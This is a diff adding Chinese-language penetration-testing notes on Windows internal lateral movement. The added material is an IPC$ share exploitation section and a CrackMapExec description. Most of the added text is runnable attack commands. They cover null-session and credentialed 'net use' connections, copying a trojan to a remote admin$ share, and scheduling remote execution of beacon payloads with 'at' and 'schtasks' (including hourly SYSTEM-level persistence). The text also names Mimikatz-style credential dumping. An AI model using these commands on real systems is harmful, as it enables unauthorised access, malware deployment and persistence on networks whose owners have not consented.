@@ -130,6 +130,77 @@ windwos内网横穿
 	- Neo-reGeorg 是一个旨在积极重构 reGeorg 的项目。
 	- 项目地址：``https://github.com/L-codes/Neo-reGeorg``
 
+IPC$共享利用
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 介绍：IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，也就是两个进程之间可以利用它产生数据交互，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。
++ 利用条件
+	- SMB协议（445端口）开启
+	- NETBios（139端口）开启
+	- 弱口令：暴力破解
++ 常用命令
+	::
+	
+		#建立空连接
+		net use \\127.0.0.1\ipc$ "" /user:""
+		权限很低，基本没什么用，在Windows2003以后，空连接什么权限都没有；
+		有些主机的 Administrator 管理员的密码为空，那么我们可以尝试连接；但是默认的服务器配置也会阻止空密码的连接。
+
+		#建立完整的用户名，密码连接
+		net use \\127.0.0.1\ipc$ "password" /user:"username"
+
+		#删除IPC$连接
+		net use \\127.0.0.1\ipc$ /del
+
+		#映射路径  (将对方的c盘映射为自己的z盘，其他盘类推)
+		net use z: \\127.0.0.1\c$ "密码" /user:"用户名"
+
+		#访问/删除路径
+		net use z: \\127.0.0.1\c$   #直接访问
+		net use c: /del     #删除映射的c盘
+		net use * /del      #删除全部,会有提示要求按y确认
+
+
+		#域中相关命令
+		net use\\去连接的IP地址\ipc$ "域成员密码"  /user:域名\域成员账号
+		net use\\192.168.100.1\ipc$ "admin123.." /user:momaek.com\win2003
+
+		dir \\momaek.com\c$
+
+		copy test.exe \\momaek.com\c$
+
+		net use \\192.168.100.1\ipc$ /del
+
+		net share       #查看自己的共享
+		net view \\IP   #查看target-IP的共享
+		netstat -A IP   #获取target-IP的端口列表
+
+		netstat -ano | findstr "port"  #查看端口号对应的PID
+		tasklist | findstr "PID"       #查看进程号对应的程序
+
++ 利用方式
+	- 构建连接: ``net use \\127.0.0.1\IPC$ "" /user:"admintitrators"``
+	- 上传木马: ``copy test.exe \\127.0.0.1\admin$``
+	- 查看时间: ``net time \\127.0.0.1``
+	- 创建定时任务: ``at \\127.0.0.1 11:05 test.exe``
++ 其它
+	- 查看文件: ``dir \\192.168.52.130\c$``
+	- 盘符映射: ``net use k: \\192.168.52.130\c$ /u:"administrator" "123456"``
+	- 查看进程: ``tasklist /S 192.168.52.130 /U administrator -P 123456``
+	- 执行定时任务: ``at \\192.168.135.5 13:20:00 cmd.exe /c "c:\beacon.exe"``
+	- 执行定时任务
+		::
+			
+			schtasks /create /s 192.168.52.130 /u administrator /p 123456 /tn test_crow /tr c:/artifact.exe  /sc once /st 15:29
+			schtasks /query /s 192.168.52.130 /u administrator /p 123456 /tn test_crow
+			在目标主机上创建一个名为test_crow的计划任务，启动程序为c:/beacon.exe ，启动权限为system，启动时间为每隔一小时启动一次
+			schtasks /create /s 192.168.52.130 /u administrator /p 123456 /tn test_crow /sc HOURLY /mo 1 /tr c:/test.exe /ru system /f
+			其他启动时间参数：
+			/sc onlogon  用户登录时启动
+			/sc onstart  系统启动时启动
+			/sc onidle   系统空闲时启动
+			#删除任务计划
+			schtasks /delete /s 192.168.52.130 /u administrator /p 123456 /tn test_crow 
+
 域渗透
 --------------------------------
 
@@ -483,6 +554,7 @@ windwos内网横穿
 
 CrackMapExec 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 介绍：域环境（活动目录）渗透测试中一站式便携工具，列举登录用户、通过SMB(Server Message Block)网络文件共享协议爬虫列出SMB分享列表。执行类似于Psexec的攻击、使用powerShell脚本执行自动式Mimikatz/Shellcode/DLL注入到内存中，dump NTDS.dit密码。
 + 地址：``https://github.com/byt3bl33d3r/CrackMapExec``
 + 安装
 	::
